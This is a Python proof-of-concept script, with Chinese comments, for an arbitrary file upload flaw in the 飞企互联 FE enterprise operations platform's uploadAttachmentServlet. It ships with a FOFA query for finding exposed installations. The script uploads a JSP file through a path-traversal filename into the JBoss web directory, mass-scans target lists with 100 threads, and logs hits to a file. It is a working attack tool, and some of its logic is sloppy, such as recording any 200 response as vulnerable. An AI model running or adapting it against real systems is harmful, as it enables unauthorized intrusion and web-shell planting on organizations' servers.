# 飞企互联-FE企业运营管理平台upload Attachment Servlet 任意文件上传漏洞

#fofa语法：app="FE-协作平台"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 

  ______ _       _                          _                       _          
 |  ____| |     (_)                        | |                     (_)         
 | |__  | |_   _ _ _ __   __ _    ___ _ __ | |_ ___ _ __ _ __  _ __ _ ___  ___ 
 |  __| | | | | | | '_ \ / _` |  / _ \ '_ \| __/ _ \ '__| '_ \| '__| / __|/ _ \
 | |    | | |_| | | | | | (_| | |  __/ | | | ||  __/ |  | |_) | |  | \__ \  __/
 |_|    |_|\__, |_|_| |_|\__, |  \___|_| |_|\__\___|_|  | .__/|_|  |_|___/\___|
            __/ |         __/ |                         | |                    
           |___/         |___/                          |_|                    
                                                                                                                                       
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="飞企互联-FE企业运营管理平台")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/servlet/uploadAttachmentServlet'
    url_payload1 ='hello.jsp;'
    url = target + url_payload
    url1=target + url_payload1
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk',
        'Content-Length': '378'
    }
    data =  '''
        -----WebKitFormBoundaryKNt0t4vBe8cX9rZk
        Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/hello.jsp"
        Content-Type: text/plain

        <% out.println("helloFLNB");%>
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
        Content-Disposition: form-data; name="json"

        {"iq":{"query":{"UpdateType":"mail"}}}
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        res1 = requests.get(url=url1,verify=False)
        if res.status_code == 200:
            if res1.status_code == 200 and 'helloFLNB' in res1.text:
                print(f"f[+]该url存在任意文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()